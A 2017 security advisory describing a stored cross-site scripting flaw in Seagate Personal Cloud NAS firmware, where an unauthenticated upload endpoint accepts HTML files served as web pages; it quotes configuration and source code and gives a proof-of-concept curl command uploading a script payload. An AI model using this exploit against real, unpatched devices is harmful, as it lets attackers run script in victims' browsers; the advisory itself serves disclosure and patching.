------------------------------------------------------------------------
Seagate Media Server stored Cross-Site Scripting vulnerability
------------------------------------------------------------------------
Yorick Koster, September 2017

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
Seagate Personal Cloud is a consumer-grade Network-Attached Storage
device (NAS). By default Seagate Media Server allows unauthenticated
users to upload files to a public share. Once a file is uploaded it can
also be downloaded again from the NAS.

No restrictions are enforced on which file types a user can upload, any
type of file can be uploaded including executable files & HTML files.
File downloads are directly handled by Lighttpd and because of this file
are processed based on its (MIME) type. An attacker can upload an HTML
file and cause Lighttpd to treat the file as a regular web page.
Consequently, uploading an HTML file can be used to execute a stored
Cross-Site Scripting attack.

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was tested on a Seagate Personal Cloud model SRN21C running
firmware versions 4.3.16.0 and 4.3.18.0. It is likely that other
devices/models are also affected.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This vulnerability has been fixed in firmware version 4.3.18.4.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2017/seagate-media-server-stored-cross-site-scripting-vulnerability.html

Seagate Media Server uses the Django web framework and is mapped to the .psp extension. Any URL that ends with .psp is automatically send to the Seagate Media Server application using the FastCGI protocol.

/etc/lighttpd/conf.d/django-host.conf:

fastcgi.server += (
".psp"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   )),
".psp/"=>
   ((
      "socket" => "/var/run/manage_py-fastcgi.socket",
      "check-local" => "disable",
      "stream-post" => "enable",
      "allow-x-send-file" => "enable",
   ))
)

URLs are mapped to specific views in the file /usr/lib/django_host/seagate_media_server/urls.py. Seagate Media Server contains an endpoint named upload.psp that allows unauthenticated users to upload arbitrary files to a public share. No restrictions are enforced on which file types a user can upload, any type of file can be uploaded including executable files & HTML files.

/usr/lib/python2.7/site-packages/sms/modules/FileOperations/file_operations.py:

@csrf_exempt
def upload( request ):
   logDebug('Processing upload request')
   response = {'stat': 'failed', 'code': '77', 'message': 'Something went wrong.'}
   if checkDBSQLite( ):
      response['code'] = '80'
      response['message'] = "The Database has not been initialized or mounted yet!"
      logDebug('Upload handler called but Database has not been initialized or mounted yet!')
      return create_upload_response(json.dumps(response), request)
   try:
      logDebug('Processing request with UploadRequestHandler')
      return UploadRequestHandler.UploadRequestHandler( request ).process( )
   except UploadRequestHandler.UploadRequestHandlerException as e:
      response['code'] = str(e.code)
      response['message'] = e.message
      logException('Exception processing UploadRequestHandlerException upload request')
      return create_upload_response(json.dumps(response), request)
   except:
      logException('Exception processing upload request')


      
Files are stored within the /media/sms-data/Public/ folder on the NAS. This folder is exposed in the Lighthttp configuration and are thus directly accessible through a web browser.

/etc/lighttpd/conf.d/sms.conf:

$HTTP["url"] =~ "^"+"/media/sms-data" {
   server.document-root = "/"
   server.follow-symlink="disable"
}

When the user browses to the uploaded file, the file will be processed based on its (MIME) type. An attacker can upload an HTML file and cause Lighttpd to treat the file as a regular web page. Consequently, uploading an HTML file can be used to execute a stored Cross-Site Scripting attack. Once uploaded the file can be used to execute a Cross-Site Scripting attack by tricking an (authenticated) user into visiting the uploaded file in their browser.
Proof of concept

First upload an HTML file containing an HTML payload, this can be done using the following curl command:

curl -i -s -k -X $'POST' \
   -H $'Content-Type: multipart/form-data; boundary=---------------------------75230038716763744201986911947' \
   --data-binary $'-----------------------------75230038716763744201986911947\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"xss.html\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0a<script>alert(\'xss\');</script>\x0a\x0d\x0a-----------------------------75230038716763744201986911947\x0d\x0aContent-Disposition: form-data; name=\"force_flag\"\x0d\x0a\x0d\x0atrue\x0d\x0a\x0d\x0a-----------------------------75230038716763744201986911947--\x0d\x0a' \
   $'http://personalcloud.local/upload.psp'

After running the curl command the HTML file can be viewed via the following URL:
http://personalcloud.local/media/sms-data/Public/xss.html
